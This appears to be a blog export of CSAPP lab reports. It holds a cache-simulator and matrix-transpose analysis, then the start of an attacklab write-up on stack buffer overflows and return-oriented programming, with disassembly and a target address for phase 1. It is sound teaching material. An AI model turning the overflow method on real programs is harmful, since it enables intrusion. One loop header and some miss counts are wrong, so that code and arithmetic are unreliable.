<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cache.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parseAddress</span><span class="params">(Cache *cache, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *tag, <span class="keyword">int</span> *setIdx)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertToHead</span><span class="params">(CacheSet *<span class="built_in">set</span>, CacheLine *node)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evictLRU</span><span class="params">(CacheSet *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlinkLine</span><span class="params">(CacheLine *node)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">CacheSet *<span class="title">newCacheSet</span><span class="params">(<span class="keyword">int</span> blockSize, <span class="keyword">int</span> E)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    CacheSet *<span class="built_in">set</span> = (CacheSet *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheSet));</span><br><span class="line">    <span class="built_in">set</span>-&gt;blockSize = blockSize;</span><br><span class="line">    <span class="built_in">set</span>-&gt;associativity = E;</span><br><span class="line">    <span class="built_in">set</span>-&gt;head = (CacheLine *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line">    <span class="built_in">set</span>-&gt;tail = (CacheLine *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line">    <span class="built_in">set</span>-&gt;head-&gt;next = <span class="built_in">set</span>-&gt;tail;</span><br><span class="line">    <span class="built_in">set</span>-&gt;tail-&gt;prev = <span class="built_in">set</span>-&gt;head;</span><br><span class="line">    <span class="built_in">set</span>-&gt;size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">set</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">Cache *<span class="title">newCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">size_t</span> capacity = (<span class="keyword">size_t</span>)<span class="built_in">pow</span>(<span class="number">2</span>, s);</span><br><span class="line">    Cache *cache = (Cache *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Cache));</span><br><span class="line">    CacheSet **sets = (CacheSet **)<span class="built_in">malloc</span>(capacity * <span class="keyword">sizeof</span>(CacheSet *));</span><br><span class="line">    <span class="keyword">int</span> blockSize = (<span class="keyword">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; capacity; i++)</span><br><span class="line">    {</span><br><span class="line">        sets[i] = newCacheSet(blockSize, E);</span><br><span class="line">    }</span><br><span class="line">    cache-&gt;sets = sets;</span><br><span class="line">    cache-&gt;b = b;</span><br><span class="line">    cache-&gt;s = s;</span><br><span class="line">    cache-&gt;t = <span class="number">64</span> - b - s;</span><br><span class="line">    <span class="keyword">return</span> cache;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">CacheLine *<span class="title">find</span><span class="params">(CacheLine *head, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">for</span> (CacheLine *p = head; p != <span class="literal">NULL</span>; p = p-&gt;next)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;tag == tag &amp;&amp; p-&gt;valid)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">CacheResult <span class="title">fetch</span><span class="params">(Cache *cache, CacheVisit *visit)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag;</span><br><span class="line">    <span class="keyword">int</span> setIdx;</span><br><span class="line">    parseAddress(cache, visit-&gt;address, &amp;tag, &amp;setIdx);</span><br><span class="line">    <span class="comment">// printf("%lld, %d, %llx\n", visit-&gt;address, setIdx, tag);</span></span><br><span class="line">    CacheSet *<span class="built_in">set</span> = cache-&gt;sets[setIdx];</span><br><span class="line">    <span class="comment">// fetch from set</span></span><br><span class="line">    CacheLine *line = find(<span class="built_in">set</span>-&gt;head, tag);</span><br><span class="line">    CacheResult result = {<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>};</span><br><span class="line">    <span class="keyword">if</span> (line != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        result.hit += <span class="number">1</span> + (visit-&gt;op == MODIFY);</span><br><span class="line">        unlinkLine(line);</span><br><span class="line">        insertToHead(<span class="built_in">set</span>, line);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">set</span>-&gt;associativity == <span class="built_in">set</span>-&gt;size)</span><br><span class="line">    {</span><br><span class="line">        evictLRU(<span class="built_in">set</span>);</span><br><span class="line">        result.eviction += <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">set</span>-&gt;size--;</span><br><span class="line">    }</span><br><span class="line">    result.miss += <span class="number">1</span>;</span><br><span class="line">    result.hit += visit-&gt;op == MODIFY;</span><br><span class="line">    line = (CacheLine *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line">    line-&gt;tag = tag;</span><br><span class="line">    line-&gt;valid = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">set</span>-&gt;size++;</span><br><span class="line">    insertToHead(<span class="built_in">set</span>, line);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parseAddress</span><span class="params">(Cache *cache, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *tag, <span class="keyword">int</span> *setIdx)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    address &gt;&gt;= cache-&gt;b;</span><br><span class="line">    *setIdx = (<span class="keyword">int</span>)(address &amp; ((<span class="number">1</span> &lt;&lt; cache-&gt;s) - <span class="number">1</span>));</span><br><span class="line">    *tag = address &gt;&gt; cache-&gt;s;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertToHead</span><span class="params">(CacheSet *<span class="built_in">set</span>, CacheLine *node)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    node-&gt;prev = <span class="built_in">set</span>-&gt;head;</span><br><span class="line">    node-&gt;next = <span class="built_in">set</span>-&gt;head-&gt;next;</span><br><span class="line">    node-&gt;prev-&gt;next = node;</span><br><span class="line">    node-&gt;next-&gt;prev = node;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlinkLine</span><span class="params">(CacheLine *node)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    node-&gt;prev-&gt;next = node-&gt;next;</span><br><span class="line">    node-&gt;next-&gt;prev = node-&gt;prev;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">removeLine</span><span class="params">(CacheLine *node)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    unlinkLine(node);</span><br><span class="line">    <span class="built_in">free</span>(node);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evictLRU</span><span class="params">(CacheSet *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    assert(<span class="built_in">set</span>-&gt;associativity == <span class="built_in">set</span>-&gt;size);</span><br><span class="line">    removeLine(<span class="built_in">set</span>-&gt;tail-&gt;prev);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="trans">trans</h2>
<p>本节要求我们编写矩阵转置的代码，最小化 cache miss。cache 的设置为直接映射，<span class="math inline">\(S=5,E=1,B=5\)</span>，数组元素是 int 类型，这意味着 cache 每块可以存储 8 个数，一共有 32 块。基础的转置函数如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, j, tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++)</span><br><span class="line">        {</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>由于不同的矩阵形状会导致不同的访问模式，指导书也允许我们针对不同的形状做特殊优化。因此我们可以一个个进行分析。</p>
<h3 id="x32">32x32</h3>
<p>首先打印出 A，B 的地址，分别为 <code>0x10d080, 0x14d080</code>，二者地址的后 10 个 bit 相同，意味着会映射到同一个组，进而发生直接映射下的冲突。接下来，分析 A，B 内部和相互的冲突模式。对于内部的地址<span class="math inline"> \(p\)</span> 与<span class="math inline"> \(p+2^{10}\)</span>，两者有着相同的组索引，进而冲突，差距正好是 32 个块，也就是 32*8/32=8 行。这意味如果访问了第 0 行后再次访问第 8 行，就会出现 cache 淘汰。</p>
<p>而 A，B 之间，由于地址是对齐的，也会出现上述的 cache 淘汰，不同的是，当 A 和 B 访问同一个块时，也会出现淘汰，不仅仅是差 8 行。</p>
<p>接下来，分析基础代码、A 的访问满足步长为 1 的空间局部性，每 8 个元素会导致 1 次 cache miss，总 miss 数 = 32*32/8=128。B 的访问满足步长为 32 的局部性，每次访问都会 cache miss，因为过了 8 行之后 cache 就被淘汰了，下次访问又需要重新加载，总 miss 数 = 32*32=1024，加和为 1052。使用 test-trans 测试后发现 miss 数为 1183，大于我们分析的结果。这是由于 A 和 B 之间的 cache 淘汰，影响了命中率。</p>
<p>上面分析得到，只有 A 和 B 访问的<strong>块的列索引相同</strong>，<strong>行索引相差为 8 的整数倍</strong>时，才会出现冲突。又由于 A 和 B 的访问模式是关于对角线对称的，又要列索引相同，不难发现冲突只会发生在对角线上（<strong>对角线元素所在的块</strong>），每行一次，共计 32 次。1052+32=1184，正好多一次。这是由于最后一行的时候，冲突发生在 A 最后一个元素访问结束，B 覆盖掉 A 之后，A 不需要再次访问这个块，冲突是无意义的，需要减去这一次，所以是 1183。</p>
<p>下一步使用分块优化。不难发现 8x8 的块比较合适，因为 cache 块中只能存 8 个元素，而且块的边长大于 8 之后，会引发新的直接映射冲突。可以写出如下的分块代码，其中 <code>height=width=8</code>。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; N; x += height)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; M; y += width)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (i = x; i &lt; x + height; i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span> (j = y; j &lt; y + width; j++)</span><br><span class="line">            {</span><br><span class="line">                tmp = A[i][j];</span><br><span class="line">                B[j][i] = tmp;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>理论分析的话，A 与 B 的每个块都会 miss 8 次，一共有 16 个块，总共是 miss 256 次。还需要考虑相互冲突。以第一个 8*8 的块为例，访问模式为：</p>
<ol type="1">
<li>加载 A [0]：A [0][0]</li>
<li> 加载 B [0]，淘汰 A [0]：B [0][0]</li>
<li><strong> 加载 A [0]，淘汰 B [0]</strong>：A[0][1]</li>
<li> 加载 B [1]-B [7]：B [1][0]-B [7][0]，A [0][2]-A [0][7]</li>
<li> 加载 A [1]，淘汰 B [1]：A [1][0]</li>
<li><strong> 加载 B [0]，淘汰 A [0]</strong>：B[0][1]</li>
<li><strong> 加载 B [1]，淘汰 A [1]</strong>：B[1][1]</li>
<li><strong> 加载 A [1]，淘汰 B [1]</strong>：A[1][2]</li>
<li> 加载 B [2]-B [7]：B [1][1]-B [7][1]，A [1][2]-A [1][7]</li>
<li> 加载 A [2]，淘汰 B [2]：A [2][0]，B [0] 命中</li>
<li><strong>加载 B [1]，淘汰 A [1]</strong>：A[2][1]</li>
<li><strong> 加载 B [2]，淘汰 A [2]</strong>：B[2][2]</li>
<li><strong> 加载 A [2]，淘汰 B [2]</strong>：A[2][3]</li>
<li>...</li>
</ol>
<p>注意其中的加粗部分，是由于相互冲突引发的额外加载。可以发现，一个块内部，除去第一行外，每一行都会引发 3 次额外 miss，因此总 miss 数为 256+4*(1+7*3)=344。使用 test-trans 测试后，结果为 343，同样需要减去最后一次。这与我们的分析是一致的。</p>
<p>接下来问题就是，如何减少这种互相冲突。不难发现，冲突的一大原因在于，访问 A 的对角线行后，会立刻加载 B 的对角线行，使得 A 的缓存失效。后续重新加载 A 又会使得 B 的缓存失效。粗略估计，这会导致 32*2=64 miss。要解决这个问题，可以使用将 A 的一行保存到寄存器里（局部变量中），避免冲突。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; N; x += height)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; M; y += width)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (i = x; i &lt; min(N, x + height); i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">int</span> tmp0 = A[i][y];</span><br><span class="line">            <span class="keyword">int</span> tmp1 = A[i][y + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp2 = A[i][y + <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp3 = A[i][y + <span class="number">3</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp4 = A[i][y + <span class="number">4</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp5 = A[i][y + <span class="number">5</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp6 = A[i][y + <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp7 = A[i][y + <span class="number">7</span>];</span><br><span class="line">            B[y][i] = tmp0;</span><br><span class="line">            B[y + <span class="number">1</span>][i] = tmp1;</span><br><span class="line">            B[y + <span class="number">2</span>][i] = tmp2;</span><br><span class="line">            B[y + <span class="number">3</span>][i] = tmp3;</span><br><span class="line">            B[y + <span class="number">4</span>][i] = tmp4;</span><br><span class="line">            B[y + <span class="number">5</span>][i] = tmp5;</span><br><span class="line">            B[y + <span class="number">6</span>][i] = tmp6;</span><br><span class="line">            B[y + <span class="number">7</span>][i] = tmp7;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>测试后，发现 miss 数为 287，减少了 57 的 miss，与 64 相近，符合我们的估计。</p>
<h3 id="section">64*64</h3>
<p>打印出 A，B 的地址，依然分别为 <code>0x10d080, 0x14d080</code>，相互冲突情况与上面类似。自冲突的话，相差 32*8/64=4 行，因此先尝试 4*4 的情况。</p>
<p>理论上分析，不带局部变量优化的版本，A 每 8 个元素 miss 1 次，B 每 4 个 miss 1 次，64*64/8+64*64/4=1536 次，再考虑相互的冲突，使用 test-trans 实测为 1891，开启局部变量后为 1699。可以发现，4*4 的块浪费了太多 cache，优化上限（不存在冲突）时 miss 数都高于 1300。因此，我们需要更充分地利用 cache 空间。</p>
<p>但是，8*8 的块模式下，B 有严重的冲突问题。不带局部变量版本，A 每 8 个元素 miss 1 次，B 每 1 个 miss 1 次（下面块冲突覆盖掉上面的块），估计 64*64/8+64*64=4068 次，实测 4723，已经与暴力求解相当，没有起到任何的优化效果。那么该怎么做呢？</p>
<p>4*4 分块的一个明显的问题在于块内数据的浪费，以 A 的第一个块为例，读入了 4 行 * 8=32 个 int，只用到了左侧的 4*4 的块，右半部分的数字根本没有用到，就会被 B 覆盖掉。而读入的 B，也只写入了左半部分，右半部分没有写入，又会被 A 的下一个块覆盖。</p>
<p>那么一个直接的想法是，能不能把这些块利用起来，提高吞吐量？我们可以把 8*8 划分为 4*4 的四个块。当读入 A 的前 4 行时：</p>
<ul>
<li>将 A 的左上块对称存放到 B 的左上</li>
<li>将 A 的右上块对称存放到 B 的右上</li>
</ul>
<p>当读入 A 的左下块时：</p>
<ul>
<li>将 A 的左上对称存放到 B 的右上</li>
<li>将 B 的原右上对称存放到 B 的左上</li>
</ul>
<p>读入 A 的右下块时，将其对称存放到 B 的右下。</p>
<p>这样以来，通过 B 的右上进行中转，我们减少了一次 A 的 4*4 块读入，提高了 cache 的利用率。</p>
<p>代码如下。值得注意的是第二个循环中，需要考虑 <strong>A 该以列读还是以行读？</strong>答案是以列读。A 以列读的模式下，B 的左下和右上都是行写入，且冲突只有 B 之间冲突，其余 3 块 cache 均是 A，此时冲突最少。如果 A 以行读，B 的左上和右下都是列写入，互相冲突，B 的每次写入都无法命中缓存，性能极差。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; N; x += <span class="number">8</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; M; y += <span class="number">8</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (i = x; i &lt; x + <span class="number">4</span>; i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">int</span> tmp0 = A[i][y];</span><br><span class="line">            <span class="keyword">int</span> tmp1 = A[i][y + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp2 = A[i][y + <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp3 = A[i][y + <span class="number">3</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp4 = A[i][y + <span class="number">4</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp5 = A[i][y + <span class="number">5</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp6 = A[i][y + <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp7 = A[i][y + <span class="number">7</span>];</span><br><span class="line">            <span class="comment">// A的左上对称到B左上</span></span><br><span class="line">            B[y][i] = tmp0;</span><br><span class="line">            B[y + <span class="number">1</span>][i] = tmp1;</span><br><span class="line">            B[y + <span class="number">2</span>][i] = tmp2;</span><br><span class="line">            B[y + <span class="number">3</span>][i] = tmp3;</span><br><span class="line">            <span class="comment">// A的右上暂存到B右上</span></span><br><span class="line">            B[y][i + <span class="number">4</span>] = tmp4;</span><br><span class="line">            B[y + <span class="number">1</span>][i + <span class="number">4</span>] = tmp5;</span><br><span class="line">            B[y + <span class="number">2</span>][i + <span class="number">4</span>] = tmp6;</span><br><span class="line">            B[y + <span class="number">3</span>][i + <span class="number">4</span>] = tmp7;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = y, i = x + <span class="number">4</span>; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">// A左下</span></span><br><span class="line">            <span class="keyword">int</span> tmp0 = A[i][j];</span><br><span class="line">            <span class="keyword">int</span> tmp1 = A[i + <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">int</span> tmp2 = A[i + <span class="number">2</span>][j];</span><br><span class="line">            <span class="keyword">int</span> tmp3 = A[i + <span class="number">3</span>][j];</span><br><span class="line">            <span class="comment">// B右上</span></span><br><span class="line">            <span class="keyword">int</span> tmp4 = B[j][i];</span><br><span class="line">            <span class="keyword">int</span> tmp5 = B[j][i + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp6 = B[j][i + <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp7 = B[j][i + <span class="number">3</span>];</span><br><span class="line">            <span class="comment">// A左下写到B右上</span></span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">            B[j][i + <span class="number">1</span>] = tmp1;</span><br><span class="line">            B[j][i + <span class="number">2</span>] = tmp2;</span><br><span class="line">            B[j][i + <span class="number">3</span>] = tmp3;</span><br><span class="line">            <span class="comment">// B右上到B左下</span></span><br><span class="line">            B[j + <span class="number">4</span>][i - <span class="number">4</span>] = tmp4;</span><br><span class="line">            B[j + <span class="number">4</span>][i - <span class="number">3</span>] = tmp5;</span><br><span class="line">            B[j + <span class="number">4</span>][i - <span class="number">2</span>] = tmp6;</span><br><span class="line">            B[j + <span class="number">4</span>][i - <span class="number">1</span>] = tmp7;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (i = x + <span class="number">4</span>; i &lt; x + <span class="number">8</span>; i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">int</span> tmp4 = A[i][y + <span class="number">4</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp5 = A[i][y + <span class="number">5</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp6 = A[i][y + <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">int</span> tmp7 = A[i][y + <span class="number">7</span>];</span><br><span class="line">            B[y + <span class="number">4</span>][i] = tmp4;</span><br><span class="line">            B[y + <span class="number">5</span>][i] = tmp5;</span><br><span class="line">            B[y + <span class="number">6</span>][i] = tmp6;</span><br><span class="line">            B[y + <span class="number">7</span>][i] = tmp7;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>经过测试，miss 数为 1179，满足了要求。</p>
<h3 id="section-1">61*67</h3>
<p>这个的难点在于不规则的形状，使得寄存器优化和子块划分都很困难。但幸运的是，这个题标准不高。使用 8*8 的子块暴力都只有 2118 的 miss，与要求的 2000 已经非常相近。切换成 16*16 的子块后，miss 数变为了 1992，擦线满分。</p>
<h2 id="总结">总结</h2>
<p>毕业答辩通过了！cache 实在是太好玩了！</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="http://csapp.cs.cmu.edu/2e/waside/waside-blocking.pdf">csapp.cs.cmu.edu/2e/waside/waside-blocking.pdf</a></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-3 实验报告: attacklab</title>
    <url>/blog/2023/12/04/CSAPP-Lab-3/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 attacklab 一节的实验报告。该 lab 要求通过 gdb 等工具，以缓冲区溢出的方式攻击二进制执行文件。 <span id="more"></span> 这段时间一直在忙秋招和毕业，很多事情都搁置了，希望毕业顺利。</p>
<h2 id="理论知识">理论知识</h2>
<p>熟悉 C 语言的同学都知道，库函数 <code>char *gets (char *str)</code> 用于一行字符串的读取，传入缓冲区地址。该函数不会进行边界检查，如果长度超出缓冲区大小，就会污染其他内存，可能造成段错误。别有用心的黑客甚至可以利用这个漏洞，执行自定义的逻辑。一般来说有两种方式。</p>
<h3 id="代码注入">代码注入</h3>
<p>如果没有栈随机化、栈执行检查等检查措施，代码注入是一种很简单的攻击手段。它的思想是，在读入的字符串中，注入汇编代码，并通过 <code>ret</code> 的跳转机制，使得代码得到执行。假设有如下的代码：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">()</span></span>{</span><br><span class="line">	Q();</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Q</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>执行逻辑为：</p>
<ol type="1">
<li>P 中通过 <code>call</code> 指令调用 Q，等价于先 <code>push</code> 下一条指令地址到栈上，再跳转到 <code>Q</code></li>
<li>Q 中申请 64 字节的栈空间，完成字符串读入和处理</li>
<li> Q 通过 <code>ret</code> 指令返回 <code>P</code>，等价于 <code>pop %rip</code>，即将栈上的地址弹出写入 PC 寄存器</li>
</ol>
<p>栈空间如下图所示：</p>
<p><img src="code_injection.png"></p>
<p>栈是向下增长的，从上到下依次是：</p>
<ol type="1">
<li>P 的栈空间（最底部为返回地址 A）</li>
<li>Q 的栈空间（B 为缓冲区起始地址）</li>
</ol>
<p>这种情况下，黑客可以在缓冲区中注入恶意代码（exploit code），并填充中间部分（pad），最后把返回地址 A 重写为缓冲区起始位置（B）。这样以来，程序在执行到 Q 中的 <code>return</code> 后，就不是回到 P 中继续执行原本的逻辑，而是开始执行黑客注入的恶意代码。</p>
<p>为了抵抗这种攻击，新的代码可以使用 <code>fgets</code> 这种带有边界检查的函数，而旧代码可以通过以下机制：</p>
<ul>
<li>栈随机偏移：每次执行都随机初始化栈的起始地址的偏移量，使得固定地址的溢出攻击失效</li>
<li>系统级保护：将栈标记为不可执行的，只有代码区可执行</li>
<li> Stack Canary：在缓冲区后放置随机的特殊值（canary），检查读入前后是否被污染</li>
</ul>
<h3 id="面向返回编程">面向返回编程</h3>
<p>栈随机偏移和系统级保护都有一定的作用，但不是无懈可击的。面向返回编程攻击（Return-Oriented Programming Attacks）的思想是，在代码区找到以 <code>c3</code>(<code>ret</code> 指令）结尾的可执行的字节序列（gadgets），将它们填充到栈上。然后，程序在执行 <code>ret</code> 指令时，会弹出栈上地址并跳转执行，执行到下一个 <code>ret</code>，重复这个过程，就把所有的 gadget 串成了一条链，实现了执行自定义逻辑的行为。如下所示：</p>
<p>[rop.png]</p>
<p>这依赖于黑客在代码区找到有用的 gadget，组装出自定义逻辑。</p>
<h2 id="code-injection">Code Injection</h2>
<h3 id="phase-1">phase 1</h3>
<p>基础的练习题目，不需要注入新的代码，只需要注入跳转地址，跳转到 <code>touch1</code> 即可。通过 <code>objdump -d</code> 对 <code>ctarget</code> 进行反汇编，可以看到 <code>touch1</code> 的起始地址为 <code>0x4017c0</code>。pdf 中介绍主函数为如下的 <code>test</code> 函数，通过 <code>getbuf-&gt;Gets</code> 完成字符串读入，<code>Gets</code> 的行为与标准库 <code>gets</code> 类似，因此我们的重点在 <code>getbuf</code> 函数。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><code>getbuf</code> 反汇编如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，<code>getbuf</code> 申请了 0x28=40 bytes 的栈空间，并把地址作为 <code>Gets</code> 函数的参数。进一步参考上面的这张图片</p>
<p><img src="code_injection.png"></p>
<p>对应可得，应该填充 40 个任意字节（不能包含换行符 0x0a），再填入缓冲区的起始地址，就可以在 <code>getbuf</code> 的 <code>retq</code> 执行完毕后，执行缓冲区逻辑。为了获取缓冲区起始地址，可以按如下步骤：</p>
